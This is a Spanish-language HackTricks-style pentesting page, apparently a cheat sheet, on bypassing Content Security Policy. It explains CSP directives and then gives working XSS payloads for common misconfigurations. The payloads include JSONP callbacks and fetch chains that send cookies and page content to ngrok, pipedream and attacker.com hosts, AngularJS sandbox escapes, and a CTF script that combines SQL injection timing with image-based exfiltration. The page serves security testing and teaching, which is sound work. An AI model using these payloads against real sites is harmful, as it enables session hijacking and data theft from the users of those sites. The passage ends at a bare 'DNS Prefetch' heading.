# Bypass de la Pol√≠tica de Seguridad de Contenido (CSP)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender m√°s sobre errores web3**

üêû Lee tutoriales sobre errores web3

üîî Recibe notificaciones sobre nuevos programas de recompensas por errores

üí¨ Participa en discusiones comunitarias

## ¬øQu√© es CSP?

La Pol√≠tica de Seguridad de Contenido o CSP es una tecnolog√≠a integrada en el navegador que **ayuda a protegerse de ataques como el cross-site scripting (XSS)**. Enumera y describe las rutas y fuentes desde las cuales el navegador puede cargar de manera segura recursos. Los recursos pueden incluir im√°genes, marcos, JavaScript y m√°s. Aqu√≠ hay un ejemplo de recursos que se permiten cargar y ejecutar en l√≠nea desde el dominio local (self) y permiten funciones de ejecuci√≥n de c√≥digo de cadena como `eval`, `setTimeout` o `setInterval:`

La Pol√≠tica de Seguridad de Contenido se implementa mediante **encabezados de respuesta** o **elementos meta de la p√°gina HTML**. El navegador sigue la pol√≠tica recibida y bloquea activamente las violaciones a medida que se detectan.

Implementado mediante encabezado de respuesta:
```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
Implementado a trav√©s de la etiqueta meta:
```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Encabezados

* `Content-Security-Policy`
* `Content-Security-Policy-Report-Only` Este no bloquear√° nada, solo enviar√° informes (√∫selo en el entorno Pre).

## Definici√≥n de recursos

CSP funciona restringiendo los or√≠genes desde donde se pueden cargar contenido activo y pasivo. Adem√°s, puede restringir ciertos aspectos del contenido activo, como la ejecuci√≥n de javascript en l√≠nea y el uso de `eval()`.
```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Directivas

* **script-src**: Esta directiva especifica las fuentes permitidas para JavaScript. Esto incluye no solo las URL cargadas directamente en elementos, sino tambi√©n cosas como los controladores de eventos de script en l√≠nea (onclick) y las hojas de estilo XSLT que pueden desencadenar la ejecuci√≥n de scripts.
* **default-src**: Esta directiva define la pol√≠tica para obtener recursos de forma predeterminada. Cuando las directivas de b√∫squeda est√°n ausentes en el encabezado CSP, el navegador sigue esta directiva de forma predeterminada.
* **Child-src**: Esta directiva define los recursos permitidos para los trabajadores web y los contenidos de marcos incrustados.
* **connect-src**: Esta directiva restringe las URL para cargar utilizando interfaces como fetch, websocket, XMLHttpRequest.
* **frame-src**: Esta directiva restringe las URL a los marcos que se pueden llamar.
* **frame-ancestors**: Esta directiva especifica las fuentes que pueden incrustar la p√°gina actual. Esta directiva se aplica a [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame), [`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe), [`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object), [`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed), o [`<applet>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet). Esta directiva no se puede usar en etiquetas y se aplica solo a recursos no HTML.
* **img-src**: Define las fuentes permitidas para cargar im√°genes en la p√°gina web.
* **font-src:** Esta directiva especifica fuentes v√°lidas para fuentes cargadas usando `@font-face`.
* **manifest-src**: Esta directiva define las fuentes permitidas de archivos de manifiesto de aplicaci√≥n.
* **media-src**: Define las fuentes permitidas desde donde se pueden cargar objetos multimedia.
* **object-src**: Define las fuentes permitidas para los elementos \<object>, \<embed>, y \<applet>.
* **base-uri**: Define las URL permitidas que se pueden cargar usando un elemento.
* **form-action**: Esta directiva enumera los puntos finales v√°lidos para la presentaci√≥n de etiquetas.
* **plugin-types**: Define l√≠mites en los tipos de mime que una p√°gina puede invocar.
* **upgrade-insecure-requests**: Esta directiva instruye a los navegadores a reescribir los esquemas de URL, cambiando HTTP a HTTPS. Esta directiva puede ser √∫til para sitios web con grandes cantidades de URL antiguas que necesitan ser reescritas.
* **sandbox**: La directiva sandbox habilita un sandbox para el recurso solicitado similar al atributo sandbox. Aplica restricciones a las acciones de una p√°gina, incluyendo la prevenci√≥n de ventanas emergentes, la prevenci√≥n de la ejecuci√≥n de complementos y scripts, y la aplicaci√≥n de una pol√≠tica de mismo origen.

### **Fuentes**

* \*: Esto permite cualquier URL excepto los esquemas `data:`, `blob:`, `filesystem:`
* **self**: Esta fuente define que se permite la carga de recursos en la p√°gina desde el mismo dominio.
* **data**: Esta fuente permite la carga de recursos a trav√©s del esquema de datos (por ejemplo, im√°genes codificadas en Base64)
* **none**: Esta directiva no permite cargar nada desde ninguna fuente.
* **unsafe-eval**: Esto permite el uso de eval() y m√©todos similares para crear c√≥digo a partir de cadenas. No es una pr√°ctica segura incluir esta fuente en ninguna directiva. Por la misma raz√≥n, se llama insegura.
* **unsafe-hashes**: Esto permite habilitar controladores de eventos en l√≠nea espec√≠ficos.
* **unsafe-inline**: Esto permite el uso de recursos en l√≠nea, como elementos en l√≠nea, URL de javascript:, controladores de eventos en l√≠nea y elementos en l√≠nea. Nuevamente, esto no se recomienda por razones de seguridad.
* **nonce**: Una lista blanca para scripts en l√≠nea espec√≠ficos que utilizan un nonce criptogr√°fico (n√∫mero utilizado una vez). El servidor debe generar un valor de nonce √∫nico cada vez que transmite una pol√≠tica.
* **sha256-\<hash>**: Lista blanca de scripts con un hash sha256 espec√≠fico.
* **strict-dynamic**: Permite al navegador cargar y ejecutar nuevas etiquetas JavaScript en el DOM desde cualquier fuente de script que haya sido previamente incluida en una valor "nonce" o "hash".
* **host**: Indica un host como example.com

## Reglas CSP inseguras

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Carga √∫til de trabajo: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' a trav√©s de Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Carga de trabajo funcional:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Si de alguna manera puedes hacer que un **c√≥digo JS permitido cree una nueva etiqueta de script** en el DOM con tu c√≥digo JS, porque un script permitido lo est√° creando, la **nueva etiqueta de script podr√° ser ejecutada**.

### Comod√≠n (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Carga de trabajo funcional:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Falta de object-src y default-src

{% hint style="danger" %}
**Parece que esto ya no funciona**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Cargas √∫tiles de trabajo:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Carga de archivos + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Si puedes subir un archivo JS puedes saltarte esta CSP:

Carga √∫til funcional:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Sin embargo, es altamente probable que el servidor est√© validando el archivo cargado y solo permitir√° cargar un tipo de archivo determinado.

Adem√°s, incluso si pudieras cargar un c√≥digo JS dentro de un archivo usando una extensi√≥n aceptada por el servidor (como: _script.png_), esto no ser√≠a suficiente porque algunos servidores como el servidor Apache seleccionan el tipo MIME del archivo en funci√≥n de la extensi√≥n y los navegadores como Chrome rechazar√°n ejecutar c√≥digo Javascript dentro de algo que deber√≠a ser una imagen. "Afortunadamente", hay errores. Por ejemplo, de un CTF aprend√≠ que Apache no conoce la extensi√≥n **.wave**, por lo tanto, no la sirve con un tipo MIME como audio/\*.

A partir de aqu√≠, si encuentras un XSS y una carga de archivos, y logras encontrar una extensi√≥n mal interpretada, podr√≠as intentar cargar un archivo con esa extensi√≥n y el contenido del script. O, si el servidor est√° verificando el formato correcto del archivo cargado, crear un pol√≠glota ([algunos ejemplos de pol√≠glotas aqu√≠](https://github.com/Polydet/polyglot-database)).

### Endpoints de terceros + ('unsafe-eval')

{% hint style="warning" %}
Para algunos de los siguientes payloads **`unsafe-eval` ni siquiera es necesario**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Cargar una versi√≥n vulnerable de Angular y ejecutar JS arbitrario:
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Cargas √∫tiles usando Angular + una biblioteca con funciones que devuelven el objeto `window` ([echa un vistazo a esta publicaci√≥n](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
La publicaci√≥n muestra que se podr√≠a **cargar** todas las **bibliotecas** desde `cdn.cloudflare.com` (o cualquier otro repositorio de bibliotecas JS permitido), ejecutar todas las funciones agregadas de cada biblioteca y verificar **qu√© funciones de qu√© bibliotecas devuelven el objeto `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>



```
### Endpoints de terceros + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Escenarios como este, donde `script-src` est√° configurado en `self` y un dominio en particular que est√° en la lista blanca, pueden ser evadidos utilizando JSONP. Los puntos finales de JSONP permiten m√©todos de devoluci√≥n de llamada inseguros que permiten a un atacante realizar XSS, el payload de trabajo es:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **contiene puntos finales JSONP listos para usar para eludir CSP de diferentes sitios web.**

La misma vulnerabilidad ocurrir√° si el **punto final de confianza contiene una redirecci√≥n abierta** porque si el punto final inicial es confiable, las redirecciones son confiables.

### Bypass de ruta de carpeta

Si la pol√≠tica CSP apunta a una carpeta y usa **%2f** para codificar **"/"**, todav√≠a se considera dentro de la carpeta. Todos los navegadores parecen estar de acuerdo con eso.\
Esto lleva a un posible bypass, usando "**%2f..%2f**" si el servidor lo decodifica. Por ejemplo, si CSP permite `http://example.com/company/` puede eludir la restricci√≥n de carpeta y ejecutar: `http://example.com/company%2f..%2fattacker/file.js`

Ejemplo en l√≠nea:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Ejecuci√≥n de JS en iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### falta de **base-uri**

Si falta la directiva **base-uri** se puede abusar de ella para realizar una [**inyecci√≥n de marcado colgante**](../dangling-markup-html-scriptless-injection.md).

Adem√°s, si la **p√°gina est√° cargando un script usando una ruta relativa** (como `/js/app.js`) usando un **Nonce**, se puede abusar de la **etiqueta base** para hacer que **cargue** el script desde **su propio servidor logrando un XSS.**\
Si la p√°gina vulnerable se carga con **httpS**, use una URL httpS en la base.
```html
<base href="https://www.attacker.com/">
```
### Eventos de AngularJS

Dependiendo de la pol√≠tica espec√≠fica, el CSP bloquear√° los eventos de JavaScript. Sin embargo, AngularJS define sus propios eventos que se pueden utilizar en su lugar. Cuando se est√° dentro de un evento, AngularJS define un objeto especial `$event`, que simplemente hace referencia al objeto de evento del navegador. Puede utilizar este objeto para realizar un bypass de CSP. En Chrome, hay una propiedad especial en el objeto `$event/event` llamada `path`. Esta propiedad contiene una matriz de objetos que hace que se ejecute el evento. La √∫ltima propiedad es siempre el objeto `window`, que podemos utilizar para realizar un escape de sandbox. Al pasar esta matriz al filtro `orderBy`, podemos enumerar la matriz y utilizar el √∫ltimo elemento (el objeto `window`) para ejecutar una funci√≥n global, como `alert()`. El siguiente c√≥digo demuestra esto:
```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
### AngularJS y dominio en lista blanca

En algunas aplicaciones web que utilizan AngularJS, se puede encontrar una pol√≠tica de seguridad de contenido (CSP) que permite solo ciertos dominios en una lista blanca. Si se encuentra una vulnerabilidad de XSS en una de estas aplicaciones, es posible que no se pueda explotar debido a la pol√≠tica de CSP. Sin embargo, hay una forma de eludir esta pol√≠tica utilizando AngularJS.

AngularJS tiene una funci√≥n llamada `$sceDelegateProvider.resourceUrlWhitelist` que se utiliza para especificar una lista blanca de URLs que se pueden cargar en la aplicaci√≥n. Si se puede encontrar una vulnerabilidad de XSS en la aplicaci√≥n, se puede utilizar esta funci√≥n para cargar un script malicioso desde un dominio en la lista blanca y ejecutarlo en la p√°gina.

Para hacer esto, se puede utilizar el siguiente c√≥digo:

```javascript
angular.module('myApp', []).config(function($sceDelegateProvider) {
  $sceDelegateProvider.resourceUrlWhitelist([
    'self',
    'https://trusted.com/**'
  ]);
});
```

Este c√≥digo agregar√° `https://trusted.com/**` a la lista blanca de URLs permitidas. Luego, se puede cargar un script malicioso desde `https://trusted.com` y ejecutarlo en la p√°gina.

Es importante tener en cuenta que esta t√©cnica solo funciona si se puede encontrar una vulnerabilidad de XSS en la aplicaci√≥n. Si la aplicaci√≥n no es vulnerable a XSS, no se puede utilizar esta t√©cnica para eludir la pol√≠tica de CSP.
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Si la aplicaci√≥n est√° utilizando angular JS y los scripts se cargan desde un dominio permitido. Es posible saltarse esta pol√≠tica CSP llamando a funciones de devoluci√≥n de llamada y clases vulnerables. Para obtener m√°s detalles, visite este impresionante [repositorio](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) de Git.

Cargas √∫tiles funcionales:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Otros puntos finales de ejecuci√≥n arbitraria JSONP se pueden encontrar [**aqu√≠**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (algunos de ellos fueron eliminados o corregidos)

### Bypass CSP con marcado colgante

Lea [c√≥mo aqu√≠](../dangling-markup-html-scriptless-injection.md).

### 'unsafe-inline'; img-src \*; a trav√©s de XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` significa que se puede ejecutar cualquier script dentro del c√≥digo (XSS puede ejecutar c√≥digo) y `img-src *` significa que se pueden usar en la p√°gina web cualquier imagen de cualquier recurso.

Se puede evadir esta CSP exfiltrando los datos a trav√©s de im√°genes (en esta ocasi√≥n, el XSS abusa de un CSRF donde una p√°gina accesible por el bot contiene una inyecci√≥n SQL, y extrae la bandera a trav√©s de una imagen):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Tambi√©n se podr√≠a abusar de esta configuraci√≥n para **cargar c√≥digo javascript insertado dentro de una imagen**. Si, por ejemplo, la p√°gina permite cargar im√°genes de Twitter, se podr√≠a **crear** una **imagen especial**, **subirla** a Twitter y abusar de "**unsafe-inline**" para **ejecutar** un c√≥digo JS (como un XSS regular) que **cargar√°** la **imagen**, **extraer√°** el **JS** de ella y lo **ejecutar√°**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Con Service Workers

La funci√≥n **`importScripts`** de los service workers no est√° limitada por CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Inyecci√≥n de Pol√≠tica

**Investigaci√≥n:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Si un **par√°metro** enviado por ti est√° siendo **pegado dentro** de la **declaraci√≥n** de la **pol√≠tica**, entonces podr√≠as **alterar** la **pol√≠tica** de alguna manera que la haga **in√∫til**. Podr√≠as **permitir scripts 'unsafe-inline'** con cualquiera de estos bypasses:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Porque esta directiva **sobrescribir√° las directivas script-src existentes**.\
Puedes encontrar un ejemplo aqu√≠: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

En Edge es mucho m√°s simple. Si puedes agregar esto en el CSP: **`;_`** Edge **eliminar√°** toda la **pol√≠tica**.\
Ejemplo: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; a trav√©s de XSS (iframe) - Ataque de tiempo

Observa la falta de la directiva `'unsafe-inline'`.\
Esta vez puedes hacer que la v√≠ctima **cargue** una p√°gina en **tu control** a trav√©s de **XSS** con un `<iframe>`. Esta vez vas a hacer que la v√≠ctima acceda a la p√°gina de donde quieres extraer informaci√≥n (**CSRF**). No puedes acceder al contenido de la p√°gina, pero si de alguna manera puedes **controlar el tiempo que la p√°gina necesita para cargarse** puedes extraer la informaci√≥n que necesitas.

Esta vez se va a extraer una **bandera**, cada vez que se adivine correctamente un **car√°cter** a trav√©s de SQLi, la **respuesta** tardar√° **m√°s tiempo** debido a la funci√≥n sleep. Entonces, podr√°s extraer la bandera:
```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### A trav√©s de Bookmarklets

Este ataque implicar√≠a ingenier√≠a social donde el atacante **convence al usuario de arrastrar y soltar un enlace sobre el bookmarklet del navegador**. Este bookmarklet contendr√≠a **c√≥digo javascript malicioso** que, al ser arrastrado y soltado o clickeado, se ejecutar√≠a en el contexto de la ventana web actual, **burlando CSP y permitiendo robar informaci√≥n sensible** como cookies o tokens.

Para obtener m√°s informaci√≥n, [**consulte el informe original aqu√≠**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Fuga de informaci√≥n CSP + Iframe

Imagina una situaci√≥n en la que una **p√°gina redirige** a otra **p√°gina con un secreto dependiendo** del **usuario**. Por ejemplo, el usuario **admin** que accede a **redirectme.domain1.com** es redirigido a **adminsecret321.domain2.com** y puedes causar un XSS al admin.\
**Adem√°s, las p√°ginas redirigidas no est√°n permitidas por la pol√≠tica de seguridad, pero la p√°gina que redirige s√≠ lo est√°.**

Puedes filtrar el dominio al que se redirige el admin a trav√©s de:

* **violaci√≥n de CSP**
* **reglas de CSP.**

La violaci√≥n de CSP es una filtraci√≥n instant√°nea. Todo lo que se necesita hacer es cargar un iframe que apunte a `https://redirectme.domain1.com` y escuchar el evento `securitypolicyviolation` que contiene la propiedad `blockedURI` que contiene el dominio del URI bloqueado. Esto se debe a que `https://redirectme.domain1.com` (permitido por CSP) redirige a `https://adminsecret321.domain2.com` (**bloqueado por CSP**). Esto hace uso de un comportamiento indefinido de c√≥mo manejar iframes con CSP. Chrome y Firefox se comportan de manera diferente en este sentido.

Cuando conoces los caracteres que pueden componer el subdominio secreto, tambi√©n puedes usar una b√∫squeda binaria y verificar cu√°ndo CSP bloque√≥ el recurso y cu√°ndo no, creando diferentes dominios prohibidos en CSP (en este caso, el secreto puede tener la forma doc-X-XXXX.secdrivencontent.dev)
```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Truco de [**aqu√≠**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender m√°s sobre errores web3**

üêû Lee tutoriales sobre errores web3

üîî Recibe notificaciones sobre nuevos programas de recompensas por errores

üí¨ Participa en discusiones comunitarias

## Tecnolog√≠as inseguras para saltarse CSP

### Sobrecarga del b√∫fer de respuesta de PHP

PHP es conocido por **almacenar en b√∫fer la respuesta a 4096** bytes por defecto. Por lo tanto, si PHP muestra una advertencia, proporcionando **suficientes datos dentro de las advertencias**, la **respuesta** se **enviar√° antes** del **encabezado CSP**, lo que hace que el encabezado sea ignorado.\
Entonces, la t√©cnica consiste b√°sicamente en **llenar el b√∫fer de respuesta con advertencias** para que el encabezado CSP no se env√≠e.

Idea de [**este writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Reescribir la p√°gina de error

A partir de [**este writeup**](https://blog.ssrf.kr/69), parece que fue posible saltarse una protecci√≥n CSP cargando una p√°gina de error (potencialmente sin CSP) y reescribiendo su contenido.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME es una t√©cnica que abusa de un XSS (o XSS altamente limitado) **en un endpoint de una p√°gina** para **abusar** de **otros endpoints del mismo origen**. Esto se hace cargando el endpoint vulnerable desde una p√°gina del atacante y luego actualizando la p√°gina del atacante al endpoint real en el mismo origen que se desea abusar. De esta manera, el **endpoint vulnerable** puede usar el objeto **`opener`** en el **payload** para **acceder al DOM** del **endpoint real a abusar**. Para obtener m√°s informaci√≥n, consulte:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Adem√°s, **wordpress** tiene un endpoint **JSONP** en `/wp-json/wp/v2/users/1?_jsonp=data` que **reflejar√°** los **datos** enviados en la salida (con la limitaci√≥n de solo letras, n√∫meros y puntos).

Un atacante puede abusar de ese endpoint para **generar un ataque SOME** contra WordPress y **incrustarlo** dentro de `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` tenga en cuenta que este **script** se **cargar√°** porque est√° **permitido por 'self'**. Adem√°s, y debido a que WordPress est√° instalado, un atacante podr√≠a abusar del **ataque SOME** a trav√©s del **endpoint callback** **vulnerable** que **bypasses the CSP** para dar m√°s privilegios a un usuario, instalar un nuevo plugin...\
Para obtener m√°s informaci√≥n sobre c√≥mo realizar este ataque, consulte [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Bypasses de exfiltraci√≥n de CSP

Si hay un CSP estricto que no le permite **interactuar con servidores externos**, hay algunas cosas que siempre puede hacer para exfiltrar la informaci√≥n.

### Location

Simplemente puede actualizar la ubicaci√≥n para enviar al servidor del atacante la informaci√≥n secreta:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Etiqueta meta

Podr√≠as redirigir mediante la inyecci√≥n de una etiqueta meta (esto es solo una redirecci√≥n, no filtrar√° contenido)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

